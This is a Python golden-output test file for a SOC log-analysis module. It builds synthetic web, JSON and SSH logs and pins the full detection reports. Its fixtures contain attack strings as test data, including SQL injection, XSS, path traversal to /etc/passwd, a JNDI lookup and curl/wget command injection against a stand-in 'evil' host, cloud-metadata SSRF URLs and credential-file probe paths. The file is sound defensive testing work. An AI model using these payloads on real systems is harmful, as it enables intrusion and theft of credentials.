"""SOC log analysis: the whole report, exactly, for a fixed set of logs.

tests/test_soc_loganalysis.py checks that each detector fires and stays quiet.
This file pins the complete output instead -- every count, order, score part,
evidence line, timeline bucket and cap -- so a refactor of analyze() that
changes anything at all shows up here. Each case is built in code with fixed
timestamps; syslog-style sshd lines are left out because they carry no year and
would date the expected reports. The fixture stores each report's summary,
limits and finding ids in full and a digest of every section (the full reports
are about 260 KB).

When a change to the analyser is *meant* to change its output, regenerate the
expected reports and review the diff like any other change:

    SOC_LOGANALYSIS_REGEN=1 python -m pytest tests/test_soc_loganalysis_golden.py --noconftest -o addopts=""
"""
import hashlib
import json
import os
import pathlib

import pytest

from utils import soc_loganalysis as la

GOLDEN = pathlib.Path(__file__).parent / "fixtures" / "soc_loganalysis_golden.json"
_REGEN = os.environ.get("SOC_LOGANALYSIS_REGEN") == "1"

UA = "Mozilla/5.0 (X11; Linux) Firefox/130.0"


def nginx(ip, path, status=200, method="GET", ua=UA, ts=None, size=512, user="-"):
    ts = ts or ts_at(0)
    return f'{ip} - {user} [{ts}] "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}"'


def ts_at(minute, second=0, hour=10, day=16, month="Oct", year=2026):
    return f"{day:02d}/{month}/{year}:{hour:02d}:{minute:02d}:{second:02d} +0000"


def iso(minute, second=0, hour=10, day=16):
    return f"2026-10-{day:02d}T{hour:02d}:{minute:02d}:{second:02d}+00:00"


def sshd(ip, msg, minute=0, second=0):
    return f"{iso(minute, second)} bastion sshd[812]: {msg.format(ip=ip)}"


def jl(**fields):
    return json.dumps(fields)


# ── the cases ─────────────────────────────────────────────────────────
# name -> (lines or raw text, analyze() keyword arguments, module constants to patch)

def _benign():
    lines = [nginx(f"45.33.33.{i % 20 + 1}", p, 200, ts=ts_at(i % 50))
             for i, p in enumerate(["/", "/admin", "/employees", "/static/app.css", "/api/leave?month=10",
                                    "/employee_portal"] * 30)]
    lines += [nginx("45.33.33.3", "/login", 200, "POST", ts=ts_at(1)), nginx("45.33.33.3", "/admin", 200, ts=ts_at(2))]
    return lines


_SIGNATURE_PATHS = [
    "/items?id=1%20UNION%20SELECT%20username,password%20FROM%20users",
    "/items?id=1' OR '1'='1",
    "/items?id=1%2527%2520OR%25201%253D1",
    "/items?id=1;SELECT pg_sleep(5)",
    "/items?id=1 AND benchmark(100,md5(1))",
    "/items?q=1 waitfor delay '0:0:5'",
    "/items?q=x' and 1=1 from information_schema.tables",
    "/items?q=1; drop table users",
    "/items?q=1 into outfile '/tmp/x'",
    "/items?q=load_file('/etc/passwd')",
    "/items?q=1;exec xp_cmdshell 'dir'",
    "/search?q=<script>alert(1)</script>",
    "/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E",
    "/search?q=javascript:alert(1)",
    "/search?q=<svg onload=alert(1)>",
    "/search?q=<iframe src=//evil>",
    "/download?f=../../etc/passwd",
    "/download?f=..%2f..%2fetc%2fpasswd",
    "/download?f=..\\..\\boot.ini",
    "/download?f=%2e%2e/%2e%2e/win.ini",
    "/download?f=/proc/self/environ",
    "/download?f=..%5c..%5cwin.ini",
    "/x?c=%24%7Bjndi:ldap://evil/a%7D",
    "/ping?host=1.1.1.1;id",
    "/ping?host=1.1.1.1|whoami",
    "/ping?host=$(curl evil)",
    "/ping?host=`wget evil`",
    "/run?c=cmd.exe /c dir",
    "/run?c=/bin/bash -i",
    "/run?c=echo aGk= | base64 -d",
    "/cgi?x=() { :; }; echo",
    "/tpl?name={{7*7}}",
    "/fetch?url=http://169.254.169.254/latest/meta-data/",
    "/fetch?u=metadata.google.internal",
    "/fetch?next=http://127.0.0.1/admin",
    "/fetch?dest=https://192.168.1.1/",
    "/report?a=1;id=5",
    "/plain%41%42",
    "/plain%zz",
]


def _signatures():
    return [nginx(f"45.33.32.{60 + i % 7}", p, 200, ts=ts_at(i % 60)) for i, p in enumerate(_SIGNATURE_PATHS)]


def _generic_text():
    return [
        "2026-10-16 10:00:00 app error param=<script>alert(1)</script> from 45.33.32.88",
        "random text ' union select 1 -- 45.33.32.89",
        "no ip no ts but ../../etc/passwd here",
        "hello world",
        "2026-10-16T10:05:00 worker started",
        "kernel: [UFW BLOCK] SRC=45.33.32.90 DST=10.0.0.1 PROTO=TCP",
        "payload %3Cscript%3E from 45.33.32.91",
        "999.1.1.1 is not an address",
    ]


def _probes_and_agents():
    probes = ["/.env", "/.git/config", "/.git/", "/.aws/credentials", "/.ssh/id_rsa", "/.svn/entries", "/.DS_Store",
              "/wp-admin/", "/wp-login.php", "/wp-content/x", "/xmlrpc.php", "/phpmyadmin/", "/pma/", "/vendor/phpunit/x",
              "/actuator/env", "/server-status", "/cgi-bin/test", "/config.php", "/config.yml", "/backup.zip",
              "/boaform/admin", "/HNAP1", "/_ignition/execute-solution", "/solr/admin", "/jenkins/script", "/admin.php",
              "/shell.php", "/eval-stdin.php"]
    lines = [nginx("45.33.32.9", p, 404, ts=ts_at(i)) for i, p in enumerate(probes)]
    for i, ua in enumerate(["sqlmap/1.7.2#stable", "Nikto/2.5", "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
                            "masscan/1.3", "gobuster/3.6", "WPScan v3.8", "Nuclei - Open-source project", "ffuf/2.1"]):
        lines.append(nginx(f"45.33.31.{i + 1}", "/", 200, ua=ua, ts=ts_at(i)))
    for i, ua in enumerate(["curl/8.5.0", "Wget/1.21", "python-requests/2.32", "Go-http-client/1.1", "libwww-perl/6.7",
                            "okhttp/4.12", "Java/17", "HttpClient/5", "curl/7.1"]):
        lines.append(nginx(f"45.33.30.{i + 1}", "/api/health", 200, ua=ua, ts=ts_at(i)))
    for i, m in enumerate(["TRACE", "CONNECT", "PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE", "DEBUG", "TRACK", "trace"]):
        lines.append(nginx("45.33.29.1", "/", 405, method=m, ts=ts_at(i)))
    lines += [nginx("45.33.29.2", "/" + "a" * 2100, 414), nginx("45.33.29.2", "/x%00.php", 400),
              nginx("45.33.29.2", "/ok", 200, ua="")]
    return lines


def _access_log_shapes():
    return [
        '45.33.28.1 - - [16/Oct/2026:10:00:00 +0000] "GET / HTTP/1.0" 200 -',
        '45.33.28.1 - - [16/Oct/2026:10:00:01 +0000] "GET /a b c HTTP/1.1" 400 0 "-" "x"',
        '45.33.28.1 - - [16/Oct/2026:10:00:02 +0000] "GET /no-version" 200 10 "-" "x"',
        '45.33.28.2 - - [16/Oct/2026:10:00:03 +0000] "-" 400 0 "-" "-"',
        '45.33.28.2 - - [16/Oct/2026:10:00:04 +0000] "\\x16\\x03\\x01" 400 157 "-" "-"',
        '45.33.28.3 - alice [16/Oct/2026:10:00:05 +0200] "POST /login HTTP/2.0" 302 0 "https://x/" "Mozilla"',
        '[2001:db8::7] - - [16/Oct/2026:10:00:06 +0000] "GET / HTTP/1.1" 200 5 "-" "x"',
        '2a00:1450:4001:81b::200e - - [16/Oct/2026:10:00:07 +0000] "GET /?q=<script> HTTP/1.1" 200 5 "-" "x"',
        'not-an-ip - - [16/Oct/2026:10:00:08 +0000] "GET / HTTP/1.1" 200 5 "-" "x"',
        '45.33.28.4 - - [32/Foo/2026:99:00:00 +0000] "GET / HTTP/1.1" 200 5 "-" "x"',
        '45.33.28.5 - - [16/Oct/2026:10:00:09 +0000] "GET / HTTP/1.1" 503 5 "-" "x"\r',
    ]


def _json_variants():
    return [
        jl(time="2026-10-16T10:00:00Z", level="ERROR", ip="45.33.33.9", path="/login", method="POST",
           event_type="waf.sqli_blocked", message="blocked"),
        jl(timestamp="2026-10-16T10:00:01.123Z", levelname="critical", remote_addr="45.33.33.10, 10.0.0.1",
           uri="/.env", request_method="GET", event_type="secops.honeypot_triggered"),
        jl(ts=1792144800, level="WARNING", client_ip="45.33.33.11", url="/api/x", status_code="404",
           event_type="auth.failure", identifier="bob"),
        jl(**{"@timestamp": "2026-10-16 10:00:03,250", "src_ip": "45.33.33.12", "request_uri": "/x?id=1' or '1'='1",
              "http_user_agent": "sqlmap/1.7", "status": "abc", "event_type": "foo.bar", "level": "ERROR"}),
        jl(asctime="2026-10-16 10:00:04", clientip="45.33.33.13", request_path="/a", ua="curl/8",
           event_type="auth.failure", level="INFO", username="carol"),
        jl(created_at="2026-10-16T10:00:05", remote_ip="45.33.33.14", event_type="waf.xss_blocked"),
        jl(time="2026-10-16T10:00:06Z", source_ip="not-an-ip", path="/", status=200),
        jl(time="2026-10-16T10:00:07Z", ip="45.33.33.15", user=12345, path="/login", method="POST", status=401),
        jl(time="2026-10-16T10:00:08Z", ip="45.33.33.16", event_type="detection.credential_stuffing", level="ERROR"),
        jl(time="2026-10-16T10:00:09Z", ip="45.33.33.17", event_type="tenant.session_mismatch", level="WARNING",
           agent="Mozilla"),
        jl(time="not a time", ip="45.33.33.18", path="/"),
        jl(ts=1e20, ip="45.33.33.19", path="/"),
        "{}",
        "{bad json",
        "[1, 2, 3]",
        '"a string"',
        jl(nested={"ip": "1.2.3.4"}),
    ]


def _logins():
    lines = []
    for i in range(15):        # refused attempts, mixed status codes
        lines.append(nginx("45.33.27.1", "/login", (401, 403, 429)[i % 3], "POST", ts=ts_at(i)))
    for i in range(12):        # GETs never count as login attempts
        lines.append(nginx("45.33.27.2", "/login", 200, "GET", ts=ts_at(i)))
    for i in range(10):        # many re-rendered forms, then a redirect
        lines.append(nginx("45.33.27.3", f"/api/login?attempt={i}", 200, "POST", ts=ts_at(i)))
    lines.append(nginx("45.33.27.3", "/api/login", 302, "POST", ts=ts_at(11)))
    lines.append(nginx("45.33.27.4", "/admin-login", 302, "POST", ts=ts_at(0)))     # early redirect is kept as first
    for i in range(12):
        lines.append(nginx("45.33.27.4", "/admin-login", 401, "POST", ts=ts_at(i + 1)))
    lines.append(nginx("45.33.27.4", "/admin-login", 303, "POST", ts=ts_at(20)))
    for i, p in enumerate(["/employee_login", "/super_admin/login", "/soc/login", "/api/employee/login", "/wp-login.php",
                           "/xmlrpc.php", "/users/sign_in", "/oauth/token", "/login/", "/loginx"]):
        lines.append(nginx("45.33.27.5", p, 401, "POST", ts=ts_at(i)))
    for i in range(10):        # HTTP basic-auth users from the access log's user field
        lines.append(nginx("45.33.27.6", "/admin_login", 401, "POST", ts=ts_at(i), user=f"user{i % 6}"))
    return lines


def _json_stuffing():
    return [jl(time=f"2026-10-16T10:00:{i:02d}Z", ip="45.33.32.30", path="/login", method="POST",
               status=401, identifier=f"user{i}") for i in range(10)]


def _enumeration():
    lines = [nginx("45.33.26.1", f"/page{i}", 404, ts=ts_at(i % 30)) for i in range(30)]
    lines += [nginx("45.33.26.2", f"/p{i}?x={i}", 404, ts=ts_at(i)) for i in range(19)]
    lines += [nginx("45.33.26.2", "/p0", 404, ts=ts_at(20))]
    return lines


def _flood():
    lines = [nginx("45.33.25.1", "/", ts=ts_at(5, i % 60)) for i in range(130)]
    lines += [nginx("45.33.25.1", "/", ts=ts_at(6, i % 60)) for i in range(150)]
    lines += [nginx("45.33.25.2", "/x", ts=ts_at(6, i % 60)) for i in range(121)]
    lines += [nginx("45.33.25.3", "/y", ts=ts_at(7, i % 60)) for i in range(119)]
    return lines


def _error_spikes():
    lines = []
    for m in range(7):
        lines += [nginx("45.33.24.1", "/x", 500 + m % 4, ts=ts_at(m, i)) for i in range(10 + m)]
        lines += [nginx("45.33.24.2", "/ok", 200, ts=ts_at(m, i)) for i in range(20)]
    lines += [nginx("45.33.24.3", "/x", 502, ts=ts_at(30, i)) for i in range(12)]
    lines += [nginx("45.33.24.4", "/ok", 200, ts=ts_at(30, i % 60)) for i in range(100)]
    return lines


def _ssh():
    users = ["root", "admin", "oracle", "test", "ubuntu", "git"]
    lines = [sshd("45.33.23.1", "Failed password for invalid user " + users[i % 6] + " from {ip} port 22 ssh2", 0, i)
             for i in range(12)]
    lines.append(sshd("45.33.23.1", "Accepted password for root from {ip} port 22 ssh2", 1))
    lines += [sshd("45.33.23.2", "Failed publickey for deploy from {ip} port 22 ssh2", 2, i) for i in range(6)]
    lines.append(sshd("45.33.23.2", "Accepted publickey for deploy from {ip} port 22 ssh2: RSA SHA256:x", 3))
    lines.append(sshd("45.33.23.3", "Invalid user guest from {ip} port 4444", 4))
    lines.append(sshd("45.33.23.3", "Connection closed by authenticating user root {ip} port 5555 [preauth]", 4, 1))
    lines.append(sshd("45.33.23.3", "Disconnecting invalid user pi {ip} port 6666: Too many", 4, 2))
    lines.append(sshd("45.33.23.3", "Failed keyboard-interactive/pam for admin from {ip} port 22 ssh2", 4, 3))
    lines.append(sshd("2001:db8::9", "Failed password for root from {ip} port 22 ssh2", 5))
    lines.append(sshd("45.33.23.4", "Received disconnect from {ip} port 22:11: Bye", 5, 1))
    lines.append(sshd("45.33.23.5", "Accepted password for ops from {ip} port 22 ssh2", 6))
    lines.append("2026-10-16T10:07:00+00:00 bastion sshd: Failed password for root from 45.33.23.6 port 22 ssh2")
    lines += [sshd("45.33.23.7", "Failed password for u" + str(i) + " from {ip} port 22 ssh2", 8, i) for i in range(4)]
    return lines


def _aggregate_caps():
    lines = []
    for k in range(7):
        ip = f"45.33.22.{k + 1}"
        lines += [nginx(ip, "/login", 401, "POST", ts=ts_at(i), user=f"u{k}{i}") for i in range(12)]
        lines += [nginx(ip, f"/missing{k}/{i}", 404, ts=ts_at(i)) for i in range(22)]
        lines += [nginx(ip, "/", 200, ts=ts_at(40, i % 60)) for i in range(125)]
    return lines


def _scoring():
    lines = [nginx("45.33.21.1", f"/a{i}", 404 if i < 20 else 200, ts=ts_at(i)) for i in range(25)]
    lines += [nginx("45.33.21.2", "/b", 500, ts=ts_at(i)) for i in range(19)]
    lines += [nginx("45.33.21.3", "/c", 404, ts=ts_at(i)) for i in range(20)]
    lines += [nginx("45.33.21.4", "/d", 200, ts=ts_at(i)) for i in range(20)]
    lines += [nginx("45.33.21.5", "/?q=<script>", 200), nginx("45.33.21.5", "/.env", 404),
              nginx("45.33.21.5", "/", method="TRACE"), nginx("45.33.21.5", "/", ua="nikto")]
    lines += [jl(time="2026-10-16T10:00:00Z", level="ERROR", ip="45.33.21.6", event_type="waf.sqli_blocked")] * 3
    return lines


def _non_public():
    lines = []
    for i, ip in enumerate(["10.0.0.5", "127.0.0.1", "192.0.2.10", "100.64.0.1", "::1", "fe80::1", "2001:db8::1",
                            "172.16.0.9", "45.33.20.1", "0.0.0.0", "169.254.1.1", "2a00:1450:4001:81b::200e"]):
        lines += [nginx(ip, "/login", 401, "POST", ts=ts_at(j)) for j in range(15)]
        lines.append(nginx(ip, "/?id=1 union select 1", 200, ts=ts_at(20), ua="sqlmap/1.7"))
    return lines


def _timeline_hour():
    lines = [nginx("45.33.19.1", "/", ts=ts_at(m, hour=h)) for h in (8, 9, 12) for m in (0, 30)]
    lines += [nginx("45.33.19.2", "/.env", 404, ts=ts_at(15, hour=9)), nginx("45.33.19.2", "/", 500, ts=ts_at(15, hour=12))]
    return lines


def _timeline_day():
    lines = [nginx("45.33.18.1", "/", ts=ts_at(0, day=d)) for d in (1, 2, 9, 11)]
    lines += [nginx("45.33.18.2", "/?q=<script>", ts=ts_at(5, day=d)) for d in (2, 11)]
    return lines


def _timeline_sparse():
    return [nginx("45.33.17.1", "/", ts=ts_at(0, year=2019)), nginx("45.33.17.1", "/", ts=ts_at(0, year=2026)),
            nginx("45.33.17.2", "/.env", 404, ts=ts_at(1, year=2026))]


def _no_timestamps():
    return ["worker 45.33.16.1 said hello", "worker 45.33.16.2 said ../../etc/passwd", "45.33.16.1 again"]


def _caps_on_lists():
    lines = [nginx("45.33.15.1", f"/path{i}", 200, method=m, ts=ts_at(i % 60))
             for i, m in enumerate(["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "FOO", "BAR", "BAZ",
                                    "QUX", "ZAP"] * 3)]
    lines += [nginx("45.33.15.2", "/", ua=f"Agent{i}/1.0", ts=ts_at(i)) for i in range(18)]
    lines += [nginx("45.33.15.3", "/", ua=s, ts=ts_at(1)) for s in ("nikto", "Nikto/2.5", "sqlmap", "nuclei")]
    lines += [nginx("45.33.15.4", "/", ua=f"curl{i}/1" if i % 2 else f"tool{i}x", ts=ts_at(1)) for i in range(12)]
    lines += [nginx("45.33.15.5", "/", ua=f"okhttp{i}/1", ts=ts_at(1)) for i in range(10)]
    return lines


def _many_offenders():
    return [nginx(f"45.{30 + k // 250}.{k % 250}.7", "/?id=1' or '1'='1", 200, ts=ts_at(k % 60)) for k in range(520)]


def _hostile():
    return [
        "a" * 20000,
        '1.2.3.4 - - [16/Oct/2026:10:00:00 +0000] "' + "GET /" + "%25" * 3000 + ' HTTP/1.1" 200 1 "-" "x"',
        "{" * 5000,
        '{"ip": "' + "9" * 3000 + '"}',
        "<" * 3000 + "script",
        "\x00\x01\x02" * 100,
        "'" * 2000 + " or " + "'" * 2000,
        '45.33.14.1 - - [16/Oct/2026:10:00:00 +0000] "GET /' + "b" * 9000 + ' HTTP/1.1" 200 1 "-" "x"',
    ]


def _tracked_ip_table_full():
    lines = [nginx("45.33.13.1", "/", ts=ts_at(0)), nginx("45.33.13.2", "/", ts=ts_at(0))]
    lines += [nginx("45.33.13.3", "/login", 401, "POST", ts=ts_at(i), user=f"x{i}") for i in range(12)]
    lines += [nginx("45.33.13.3", f"/m{i}", 404, ts=ts_at(i)) for i in range(25)]
    lines += [nginx("45.33.13.3", "/?q=<script>", 500, ts=ts_at(1, i)) for i in range(15)]
    lines += [nginx("45.33.13.3", "/", 200, ts=ts_at(2, i % 60), size=100) for i in range(130)]
    lines += [jl(time="2026-10-16T10:00:00Z", level="ERROR", ip="45.33.13.4", event_type="waf.sqli_blocked")]
    lines += [sshd("45.33.13.5", "Failed password for root from {ip} port 22 ssh2", 3, i) for i in range(6)]
    lines += [nginx("45.33.13.6", "/", ua="nikto"), nginx("45.33.13.6", "/", method="TRACE")]
    return lines


def _distinct_caps():
    lines = [nginx("45.33.12.1", f"/q{i}", 404, ts=ts_at(i)) for i in range(12)]
    lines += [sshd("45.33.12.2", "Failed password for invalid user n" + str(i) + " from {ip} port 22 ssh2", 0, i)
              for i in range(9)]
    lines += [nginx("45.33.12.3", "/login", 401, "POST", ts=ts_at(i), user=f"k{i}") for i in range(9)]
    return lines


CASES = {
    "empty": ("", {}, {}),
    "blank_lines": ("\n\n  \n\r\n", {}, {}),
    "benign": (_benign(), {}, {}),
    "signatures": (_signatures(), {}, {}),
    "generic_text": (_generic_text(), {}, {}),
    "probes_and_agents": (_probes_and_agents(), {}, {}),
    "access_log_shapes": (_access_log_shapes(), {}, {}),
    "json_variants": (_json_variants(), {}, {}),
    "logins": (_logins(), {}, {}),
    "logins_low_thresholds": (_logins(), {"brute_force_min": 3, "enumeration_min": 2, "flood_per_minute": 5}, {}),
    "json_stuffing": (_json_stuffing(), {}, {}),
    "enumeration": (_enumeration(), {}, {}),
    "enumeration_threshold": (_enumeration(), {"enumeration_min": 19}, {}),
    "flood": (_flood(), {}, {}),
    "error_spikes": (_error_spikes(), {}, {}),
    "ssh": (_ssh(), {}, {}),
    "aggregate_caps": (_aggregate_caps(), {}, {}),
    "scoring": (_scoring(), {}, {}),
    "non_public": (_non_public(), {}, {}),
    "timeline_hour": (_timeline_hour(), {}, {}),
    "timeline_day": (_timeline_day(), {}, {}),
    "timeline_sparse": (_timeline_sparse(), {}, {}),
    "timeline_bucket_cap": ([nginx("45.33.11.1", "/", ts=ts_at(m)) for m in (0, 30)] + [nginx("45.33.11.2", "/.env", 404,
                            ts=ts_at(15))], {}, {"TIMELINE_MAX_BUCKETS": 10}),
    "no_timestamps": (_no_timestamps(), {}, {}),
    "caps_on_lists": (_caps_on_lists(), {}, {}),
    "many_offenders": (_many_offenders(), {}, {}),
    "hostile": (_hostile(), {}, {}),
    "everything_mixed": ([line for group in zip(_logins(), _signatures(), _json_variants(), _ssh(), _probes_and_agents(),
                                                _access_log_shapes(), _generic_text())
                          for line in group] + _flood()[:200] + _error_spikes()[:150], {}, {}),
    "cap_lines": ([nginx("45.33.10.1", "/") for _ in range(200)], {}, {"MAX_LINES": 50}),
    "cap_bytes": ([nginx("45.33.10.2", f"/{i}") for i in range(100)], {}, {"MAX_BYTES": 1000}),
    "cap_time_budget": ([nginx("45.33.10.3", "/", ts=ts_at(i % 60)) for i in range(2500)], {},
                        {"TIME_BUDGET_SECONDS": -1}),
    "cap_tracked_ips": (_tracked_ip_table_full(), {}, {"MAX_TRACKED_IPS": 3}),
    "cap_distinct_per_ip": (_distinct_caps(), {"enumeration_min": 5}, {"MAX_DISTINCT_PER_IP": 5}),
    "cap_evidence": (_signatures() + _aggregate_caps()[:200], {}, {"EVIDENCE_PER_FINDING": 2, "EVIDENCE_CHARS": 50}),
}


def run_case(name):
    """The case's report, with the one non-deterministic field (elapsed time) zeroed."""
    lines, kwargs, patches = CASES[name]
    text = lines if isinstance(lines, str) else "\n".join(lines)
    saved = {k: getattr(la, k) for k in patches}
    try:
        for k, v in patches.items():
            setattr(la, k, v)
        report = la.analyze(text, **kwargs)
    finally:
        for k, v in saved.items():
            setattr(la, k, v)
    report["summary"]["elapsed_ms"] = 0
    return json.loads(json.dumps(report))


def fingerprint(report):
    """What is stored per case: the summary, limits and finding ids in full (so a
    regenerated file reads as a meaningful diff), and a SHA-256 of every report
    section serialised in order (so nothing else can change unnoticed -- key
    order included, which the console's tables rely on)."""
    return {
        "summary": report["summary"],
        "limits": report["limits"],
        "finding_ids": [f["id"] for f in report["findings"]],
        "sha256": {key: hashlib.sha256(json.dumps(value).encode()).hexdigest()[:24] for key, value in report.items()},
    }


def _expected():
    if _REGEN:
        GOLDEN.write_text(json.dumps({name: fingerprint(run_case(name)) for name in CASES}, indent=1) + "\n",
                          encoding="utf-8")
    return json.loads(GOLDEN.read_text(encoding="utf-8"))


@pytest.fixture(scope="module")
def expected():
    return _expected()


def test_every_case_has_an_expected_report(expected):
    assert sorted(expected) == sorted(CASES)


@pytest.mark.parametrize("name", sorted(CASES))
def test_report_matches_expected(name, expected):
    got, want = fingerprint(run_case(name)), expected[name]
    for key in ("summary", "limits", "finding_ids"):
        assert got[key] == want[key], key
    changed = sorted(k for k in set(got["sha256"]) | set(want["sha256"]) if got["sha256"].get(k) != want["sha256"].get(k))
    assert not changed, f"report sections changed: {changed}"
